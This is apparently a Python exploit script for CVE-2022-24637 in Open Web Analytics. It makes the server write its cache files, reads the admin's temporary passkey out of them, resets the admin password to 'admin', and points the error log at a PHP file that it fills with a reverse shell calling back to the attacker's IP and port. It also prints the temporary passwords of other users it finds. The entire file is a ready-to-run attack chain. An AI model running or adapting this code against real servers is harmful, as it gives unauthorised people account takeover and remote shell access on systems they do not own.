import argparse
import requests
import base64
import re
import random
import string
import hashlib
import sys

def get_random_string(length):
   chars = string.ascii_letters + string.digits
   return ''.join(random.choice(chars) for i in range(length))

def get_normalized_url(url):
   if url[-1] != '/':
      url += '/'
   if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
      url = "http://" + url
   return url

def get_cache_content(cache_raw):
   regex_cache_base64 = r'\*(\w*)\*'
   regex_result = re.search(regex_cache_base64, cache_raw)
   if not regex_result:
      print('The provided URL does not appear to be vulnerable ...')
      exit()
   else:
      cache_base64 = regex_result.group(1)
   return base64.b64decode(cache_base64).decode("ascii")

def get_cache_username(cache):
   regex_cache_username = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
   return re.search(regex_cache_username, cache).group(1)

def get_cache_temppass(cache):
   regex_cache_temppass = r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
   return re.search(regex_cache_temppass, cache).group(1)

def get_update_nonce(url):
   try:
      update_nonce_request = session.get(url)
      regex_update_nonce = r'owa_nonce" value="(\w*)"'
      update_nonce = re.search(regex_update_nonce, update_nonce_request.text).group(1)
   except Exception as e:
      print('An error occurred when attempting to update config!')
      print(e)
      exit()
   else:
      return update_nonce

parser = argparse.ArgumentParser(description='Exploit for CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA)')
parser.add_argument('TARGET', type=str, help='Target URL (Example: http://localhost/owa/ or https://victim.xyz:8000/)')
parser.add_argument('ATTACKER_IP', type=str, help='Address for reverse shell listener on attacking machine')
parser.add_argument('ATTACKER_PORT', type=str, help='Port for reverse shell listener on attacking machine')

if(sys.argv==1):
	parser.print_help()
	parser.exit()

args = parser.parse_args()

username = "admin"
new_password = "admin"

# necessary urls
base_url = get_normalized_url(args.TARGET)
login_url = base_url + "index.php?owa_do=base.loginForm"
password_reset_url = base_url + "index.php?owa_do=base.usersPasswordEntry"
update_config_url = base_url + "index.php?owa_do=base.optionsGeneral"

# create rev-shell 
reverse_shell = '<?php $sock=fsockopen("' + args.ATTACKER_IP + '",'+ args.ATTACKER_PORT + ');$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'
shell_filename = get_random_string(8) + '.php'
shell_url = base_url + 'owa-data/caches/' + shell_filename

session = requests.Session()

#try loggin for creating a cache
try:
   data = {
      "owa_user_id": username, 
      "owa_password": username, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data)

except Exception as e:
   print('An error occurred during the login attempt!')
   print(e)
   exit()

else:
   print('Attempting to generate cache for "' + username + '" user')

print('Attempting to find cache of "' + username + '" user')

found = False

for key in range(100):
  user_id = 'user_id' + str(key)
  userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
  filename = userid_hash + '.php'
  cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
  cache_request = requests.get(cache_url)
  if cache_request.status_code != 200:
     continue;
  cache_raw = cache_request.text
  cache = get_cache_content(cache_raw)
  cache_username = get_cache_username(cache)
  if cache_username != username:
     print('The temporary password for a different user was found. "' + cache_username + '": ' + get_cache_temppass(cache))
     continue;
  else:
     found = True
     break
if not found:
  print('No cache found. Are you sure "' + username + '" is a valid user?')
  exit()

cache_temppass = get_cache_temppass(cache)
print('Found temporary password for user "' + username + '": ' + cache_temppass)

try:
   data = {
      "owa_password": new_password, 
      "owa_password2": new_password, 
      "owa_k": cache_temppass, 
      "owa_action": 
      "base.usersChangePassword"
   }
   session.post(password_reset_url, data=data)
except Exception as e:
   print('An error occurred when changing the user password!')
   print(e)
   exit()
else:
   print('Changed the password of "' + username + '" to "' + new_password + '"')

try:
   data = {
      "owa_user_id": username, 
      "owa_password": new_password, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data)
except Exception as e:
   print('An error occurred during the login attempt!')
   print(e)
   exit()
else:
   print('Logged in as "' + username + '" user')

nonce = get_update_nonce(update_config_url)

try:
   log_location = "/var/www/html/owa/owa-data/caches/" + shell_filename
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
   session.post(update_config_url, data=data)
except Exception as e:
   print('An error occurred when attempting to update config!')
   print(e)
   exit()
else:
   print('Creating log file')

nonce = get_update_nonce(update_config_url)

try:
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": reverse_shell 
   }
   session.post(update_config_url, data=data)
except Exception as e:
   print('An error occurred when attempting to update config!')
   print(e)
   exit()
else:
   print('Wrote payload to log file')

try:
   session.get(shell_url)
except Exception as e:
   print(e)
else:
   print('Triggering payload! Check your listener!')
   print('You can trigger the payload again at "' + shell_url + '"')